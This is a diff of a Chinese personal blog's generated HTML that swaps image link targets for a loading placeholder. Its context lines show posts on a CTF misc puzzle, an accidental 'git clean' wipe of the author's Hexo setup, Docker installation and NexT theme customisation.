-<a href="/2020/03/09/xctf-misc-wp/15.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>misc新题型解锁：开心猜猜猜！</p>
 <p>最后我：</p>
-<a href="/2020/03/09/xctf-misc-wp/16.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/16.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/16.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>二更：官方wp</p>
-<a href="/2020/03/09/xctf-misc-wp/17.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/17.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/17.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>其中用steghide爆破的密码为：ctf</p>
 <p>u1s1，还不如去猜flag……..</p>
@@ -280,7 +280,7 @@
 <p>此时问题出现了，网站内容没更新！！！</p>
 <p>再刷新几次试试。。。还是没有！！！！</p>
 <p>回来再部署一次！一定是姿势不对！</p>
-<a href="/2020/03/07/A-painful-experience/5.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/07/A-painful-experience/5.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/07/A-painful-experience/5.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>淦！！为啥还是没有，研究一下hexo d之后的内容。。</p>
 <p>“Branch ‘master’ set up to track remote branch ‘master’ from”？？？？？？</p>
@@ -290,25 +290,25 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clean -f -d</span><br></pre></td></tr></table></figure></div>
 
 <p>就是它！！就是它！！它摧毁了我的hexo，它删掉了我辛辛苦苦配置了很久的next和butterfly</p>
-<a href="/2020/03/07/A-painful-experience/1.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/1.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/1.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>第一反应woc！！！赶紧去回收站看看，有救没？？有救没？？？</p>
 <p>没有了！！！5555草5555！！！</p>
 <p>于是悲伤地卸掉hexo打算重新来过</p>
-<a href="/2020/03/07/A-painful-experience/3.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/03/07/A-painful-experience/3.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/03/07/A-painful-experience/3.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>但是再下下来后，发现hexo s连TM自己本地的4000端口都看不来了！！（急了急了脑子没了</p>
 <p>那时候已经一点多了，我悲伤地发出了一篇纪念我短暂博客生涯的说说</p>
 <p>那时已经在看Ghost怎么搭建了（但是说真的还是放不下hexo，作业那么多，也没有重头再来的勇气了</p>
 <p>这时一位学姐的评论，又让我看到blog转生的希望</p>
-<a href="/2020/03/07/A-painful-experience/4.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/4.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/4.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>DiskGenius文件数据恢复工具，然后就去扫我的磁盘</p>
 <p>但是有用的只找到了一部分，很多都丢了（像styl文件、yml文件</p>
 <p>比较惊喜的还是把自己之前发博客写的md文件找到了（很重要，没这个我贼难受，懒得copy了</p>
 <p>这时时间来到了3点多钟，我不甘心的睡下了，仿佛看开了，其实脑子里全都是</p>
 <p>“Branch ‘master’ set up to track remote branch ‘master’ from”。。。。。。。。。</p>
-<a href="/2020/03/07/A-painful-experience/6.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/6.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/6.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>时间来到了今天，早上爬起来水了道战疫的misc后。。</p>
 <p>淦！我不甘心！爷要从头开始！！！（md，要不是这事，我OS实验一应该写的差不多了</p>
@@ -316,11 +316,11 @@
 <p>hexo clean g d。。！！？？还是之前的样子？？？？</p>
 <p>这次又去研究了下分叉，切到.deploy<code>git branch -a</code>。。。就一个master呀</p>
 <p><code>ssh -v git@xx.xx.xx.xx</code>在服务器里切到blog.git。。。就一个master呀</p>
-<a href="/2020/03/07/A-painful-experience/7.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/7.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/7.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>WinSCP连上服务器，看一下文件更新时间？？是今天下午啊！没错呀！</p>
 <p>此时的我意识到了问题的不对劲</p>
-<a href="/2020/03/07/A-painful-experience/8.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/8.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/8.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>每次在Edge进博客进得都很快，我知道可能是有缓存之类的，但是清除缓存后好像没并没有什么卵用</p>
 <p>于是我打算换一个浏览器进入一下我的博客（  Firefox启动，Google启动</p>
@@ -329,7 +329,7 @@
 <p>我突然想到了我昨天下午搞的骚东西——CDN，好像没搞完就放那不管了</p>
 <p>接下来我发现我的域名解析暂停了没开，CDN暂停了没删</p>
 <p>真相只有一个</p>
-<a href="/2020/03/07/A-painful-experience/9.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/07/A-painful-experience/9.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/07/A-painful-experience/9.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>Edge是个 随便！！（好吧，其实是我菜，但是edge浏这个览器连我域名没开解析都能进去的机制属实恶心</p>
 <p>还有就是为啥我拿dl进去是更新的状态，自己的ip却不更新的（我咋觉得还跟上次扫目录有关。。</p>
@@ -358,7 +358,7 @@
 <h5 id="事件记录"><a href="#事件记录" class="headerlink" title="事件记录"></a>事件记录</h5><p>curl太慢（卡着卡着停了）、python2退休（确实不方便）、pip安装不成功</p>
 <p>权限赋予 chmod、教程没啥说的下面挺全</p>
 <p>学习过程再更，（众所周知，安装≈学会）</p>
-<p><a href="/2020/03/02/Docker-learning/t.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2020/03/02/Docker-learning/t.jpg" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="/2020/03/02/Docker-learning/t.jpg" src="/img/loading.gif" class="lazyload" title></a></p>
 <h5 id="相关网址："><a href="#相关网址：" class="headerlink" title="相关网址："></a>相关网址：</h5><p><a href="https://blog.csdn.net/deng624796905/article/details/86493330" target="_blank" rel="noopener">Docker入门</a></p>
 <p><a href="https://blog.csdn.net/zzq060143/article/details/91050272" target="_blank" rel="noopener">Win10中docker的安装与使用</a></p>
 <p><a href="https://blog.csdn.net/weixin_44725156/article/details/104403204" target="_blank" rel="noopener">Centos7安装Docker Compose(pip方式安装)</a></p>
@@ -407,7 +407,7 @@
 
 <p>换成淘宝的源会好很多</p>
 <h3 id="自定义配置文件"><a href="#自定义配置文件" class="headerlink" title="自定义配置文件"></a>自定义配置文件</h3><p>如果想自定义一些自己的样式，而你的版本恰是Next7.X的话（目前最新的Next）。你会发现很多文章中提及的custom文件（可以自由编辑样式的一个文件）没有了。这时你可以在根目录下的source文件下面新建一个_data文件夹，然后在里面新建建一个styles.styl，并在主题配置里设置一下（如下图），这样你就可以在里面加一些自定义的代码了。</p>
-<a href="/2020/02/15/My-first/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/02/15/My-first/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/02/15/My-first/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 
 
